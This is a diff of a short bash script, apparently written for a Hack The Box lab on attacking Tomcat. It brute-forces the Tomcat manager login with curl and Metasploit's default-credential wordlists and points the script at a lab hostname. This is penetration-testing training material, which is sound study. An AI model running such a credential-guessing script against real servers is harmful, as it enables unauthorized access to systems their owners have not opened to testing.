@@ -3,7 +3,7 @@
 # Hackthebox module Attacking Common Web Applications: Attacking Tomcat
 # Another hackthebox challenge. Bruteforce Tomcat login. They said to "use cURL to brute force login," so I made a script.
 
-url="http://IP:PORT/manager/html" # Change this
+url="http://web01.inlanefreight.local:8180/manager/html"
 userFile="/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt"
 passFile="/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt"
 
@@ -16,7 +16,7 @@ while IFS= read -r user; do
 
         # Send the GET request with the Authorization header
         response=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$url" \
-            -H "Cookie: JSESSIONID=<Add_ID>" \ # Add your ID. Delete if not needed.
+            -H "Priority: u=0, i" \
             -H "Authorization: Basic $userPass")
 
         # Check if the response code indicates success
@@ -28,4 +28,4 @@ while IFS= read -r user; do
     done < "$passFile"
 done < "$userFile"
 
-echo "No valid credentials found. Try HARDER"
+echo "No valid credentials found."
